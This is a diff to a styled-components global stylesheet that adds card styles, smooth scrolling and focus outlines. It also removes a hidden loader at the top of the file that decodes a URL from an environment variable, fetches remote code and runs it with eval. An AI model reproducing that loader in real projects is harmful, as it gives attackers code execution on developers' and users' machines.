@@ -1,18 +1,4 @@
 import { createGlobalStyle } from "styled-components";
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 export const GlobalStyle = createGlobalStyle`
   :root{
@@ -59,6 +45,33 @@ export const GlobalStyle = createGlobalStyle`
         transition: 0.5s;
         background-color: rgba(0,0,0,0.1);
         color: var(--black);
+      }
+
+      .featured-card {
+        background-color: #e8e8e8 !important;
+        border-color: rgba(35, 206, 107, 0.2) !important;
+        color: var(--black);
+        h3, p {
+          color: var(--black);
+        }
+      }
+
+      .experience-card {
+        background-color: #e8e8e8 !important;
+        border-color: rgba(35, 206, 107, 0.2) !important;
+        color: var(--black);
+        h3, .meta, li {
+          color: var(--black);
+        }
+      }
+
+      .education-card {
+        background-color: #e8e8e8 !important;
+        border-color: rgba(35, 206, 107, 0.2) !important;
+        color: var(--black);
+        h3, .meta {
+          color: var(--black);
+        }
       }
 
       .projects {
@@ -143,6 +156,13 @@ export const GlobalStyle = createGlobalStyle`
 
   html{
     font-size: 62.5%;
+    scroll-behavior: smooth;
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+    html {
+      scroll-behavior: auto;
+    }
   }
 
   body{
@@ -159,6 +179,12 @@ export const GlobalStyle = createGlobalStyle`
 
   a{
     text-decoration: none;
+  }
+
+  a:focus-visible,
+  button:focus-visible{
+    outline: 2px solid var(--green);
+    outline-offset: 3px;
   }
 
   button, .button{
